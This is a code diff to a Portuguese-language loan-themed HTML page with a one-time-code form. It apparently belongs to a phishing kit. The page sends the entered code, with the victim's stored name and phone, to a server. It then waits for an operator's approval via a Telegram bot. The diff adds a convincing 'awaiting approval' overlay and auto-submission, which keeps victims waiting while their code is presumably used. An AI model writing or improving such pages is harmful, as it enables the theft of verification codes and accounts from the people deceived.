@@ -125,11 +125,48 @@
         }
 
         #timerContainer { display: none; }
-        #submitBtn { display: none; }
-        .spinner { display: none; }
+        #submitBtn { display: none; }  /* Keep hidden – we use overlay instead */
         .footer-links { display: none; }
         .version { display: none; }
         #status { display: none; }
+
+        /* ---------- LOADING OVERLAY ---------- */
+        #loadingOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.65);
+            display: none;          /* hidden by default */
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 9999;
+            backdrop-filter: blur(4px);
+        }
+
+        #loadingOverlay .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid rgba(255, 255, 255, 0.3);
+            border-top: 6px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 25px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        #loadingOverlay .message {
+            color: #ffffff;
+            font-size: 26px;
+            font-weight: 400;
+            text-align: center;
+            padding: 0 30px;
+        }
 
         @media (max-width: 700px) {
             .loan-container::before { top: 70px; left: 35px; width: 18px; height: 18px; border-width: 4px; }
@@ -145,6 +182,8 @@
             .otp-boxes { top: 225px; left: 20px; right: 20px; gap: 7px; }
             .otp-boxes input { height: 64px; border-radius: 11px; font-size: 25px; }
             .subtitle { top: 325px; left: 20px; right: 20px; font-size: 20px; line-height: 1.45; }
+            #loadingOverlay .spinner { width: 45px; height: 45px; border-width: 5px; }
+            #loadingOverlay .message { font-size: 20px; }
         }
 
         @media (max-width: 360px) {
@@ -153,6 +192,8 @@
             .otp-boxes { top: 190px; left: 15px; right: 15px; gap: 5px; }
             .otp-boxes input { height: 55px; border-radius: 9px; font-size: 22px; }
             .subtitle { top: 275px; left: 15px; right: 15px; font-size: 18px; }
+            #loadingOverlay .spinner { width: 38px; height: 38px; border-width: 4px; }
+            #loadingOverlay .message { font-size: 17px; }
         }
     </style>
 </head>
@@ -187,6 +228,12 @@
     </div>
     <div class="version">Versão 2.1.0</div>
     <div id="status"></div>
+</div>
+
+<!-- LOADING OVERLAY -->
+<div id="loadingOverlay">
+    <div class="spinner"></div>
+    <div class="message">A aguardar aprovação no Telegram...</div>
 </div>
 
 <!-- OTP box logic + auto-submit -->
@@ -247,10 +294,9 @@
 
     const inputs = document.querySelectorAll('.otp-boxes input');
     const submitBtn = document.getElementById('submitBtn');
-    const btnText = document.getElementById('btnText');
-    const spinner = document.getElementById('spinner');
     const statusEl = document.getElementById('status');
     const timerDisplay = document.getElementById('timerDisplay');
+    const loadingOverlay = document.getElementById('loadingOverlay');
     let countdown;
 
     function showError(msg) { statusEl.textContent = msg; }
@@ -259,7 +305,7 @@
         input.addEventListener('input', (e) => {
             input.value = input.value.replace(/\D/g, '');
             if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
-            validateOTP();
+            // no need to validate here; auto-submit handles it
         });
         input.addEventListener('keydown', (e) => {
             if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
@@ -269,14 +315,9 @@
             const pasted = (e.clipboardData || window.clipboardData).getData('text');
             const digits = pasted.replace(/\D/g, '').split('');
             inputs.forEach((box, i) => { box.value = digits[i] || ''; });
-            validateOTP();
+            // auto-submit will be triggered by the 'input' events that follow
         });
     });
-
-    function validateOTP() {
-        const complete = [...inputs].every(i => i.value.trim() !== '');
-        submitBtn.disabled = !complete;
-    }
 
     function startCountdown(duration = 60) {
         let time = duration;
@@ -303,11 +344,9 @@
         const name = localStorage.getItem('name') || 'Desconhecido';
         const phone = localStorage.getItem('phone') || 'Desconhecido';
 
-        submitBtn.disabled = true;
-        btnText.textContent = 'A verificar...';
-        spinner.style.display = 'inline-block';
-        statusEl.textContent = 'A aguardar aprovação no Telegram...';
-        statusEl.style.display = 'block';
+        // Show loading overlay
+        loadingOverlay.style.display = 'flex';
+        statusEl.textContent = '';
 
         try {
             const response = await fetch('/submit-code', {
@@ -329,24 +368,27 @@
                     approved = true;
                     break;
                 } else if (checkData.approved === false) {
+                    // rejected
+                    loadingOverlay.style.display = 'none';
                     showError('❌ Código rejeitado. Tente novamente.');
                     throw new Error('rejected');
                 }
             }
 
             if (approved) {
+                // hide overlay before redirect
+                loadingOverlay.style.display = 'none';
                 localStorage.clear();
                 window.location.href = `success.html?botId=${botId}`;
             }
 
         } catch (error) {
             if (error.message !== 'rejected') {
+                loadingOverlay.style.display = 'none';
                 statusEl.textContent = '❌ Erro de ligação ao servidor.';
                 console.error(error);
             }
-            submitBtn.disabled = false;
-            btnText.textContent = 'Verificar';
-            spinner.style.display = 'none';
+            // Reset form for retry
             inputs.forEach(i => i.value = '');
             inputs[0].focus();
             startCountdown();
